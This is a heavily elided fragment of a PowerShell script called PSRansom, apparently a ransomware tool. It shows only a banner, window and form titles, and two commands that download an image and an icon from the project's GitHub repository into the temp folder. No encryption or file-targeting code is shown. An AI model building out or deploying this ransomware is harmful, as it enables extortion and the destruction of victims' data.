...
$Host.UI.RawUI.WindowTitle = "PSRansom - by @BenzoXdev" 
...
function Show-Banner {
   ...
   Write-Host                                                            
   Write-Host "  ----------------- by @BenzoXdev ----------------  " -ForegroundColor Green }
...
Invoke-WebRequest -useb https://raw.githubusercontent.com/BenzoXdev/PSRansom/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/BenzoXdev/PSRansom/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
...
$form.Text = "PSRansom by @BenzoXdev - https://github.com/BenzoXdev/PSRansom"
